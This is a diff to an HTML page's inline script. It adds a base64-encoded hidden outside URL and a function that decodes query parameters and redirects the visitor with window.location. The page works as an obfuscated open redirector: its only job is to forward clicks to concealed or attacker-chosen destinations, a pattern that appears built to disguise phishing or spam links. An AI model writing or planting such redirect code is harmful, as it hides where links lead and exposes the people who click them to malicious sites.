@@ -2,12 +2,37 @@
 	<head>
 		<meta charset="UTF-8">
 		<script>
+			var _s = "aHR0cDovL2JlbmNlLmV1cm9tZWRpYS1zemVnZWQuaHUv";
+		
 			var keyStr = "ABCDEFGHIJKLMNOP" +
                "QRSTUVWXYZabcdef" +
                "ghijklmnopqrstuv" +
                "wxyz0123456789+/" +
                "=";
 
+			function dr(base, data)
+			{
+				if(data.length == 0)
+				{
+					document.write("0x01");
+				}
+				else	
+				{
+					var s = data.split('_');
+					if(s.length == 3)
+					{
+						var d = dec(s[0] + s[2]);
+					
+						window.location = base + d;
+						document.write("...");
+					}
+					else
+					{
+						document.write("0x02");
+					}
+				}
+			}
+			   
 			function getParameterByName(name) {
 				name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
 				var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
@@ -43,27 +68,25 @@
 				
 				return unescape(output);
 			}
-
-			var data = getParameterByName('tid');
-			if(data.length == 0)
+			
+			var bid = getParameterByName('bid');
+			if(bid.length > 0)
 			{
-				document.write("0x01");
+				dr(dec(_s), bid);
 			}
 			else
 			{
-				var s = data.split('_');
-				if(s.length == 3)
+				var tid = getParameterByName('tid');
+				if(tid.length > 0)
 				{
-					var d = dec(s[0] + s[2]);
-					
-					window.location = d;
-					document.write("...");
+					dr("", tid);
 				}
 				else
 				{
-					document.write("0x02");
+					document.write("0x03");
 				}
 			}
+
 		</script>
 	</head>
 </html>
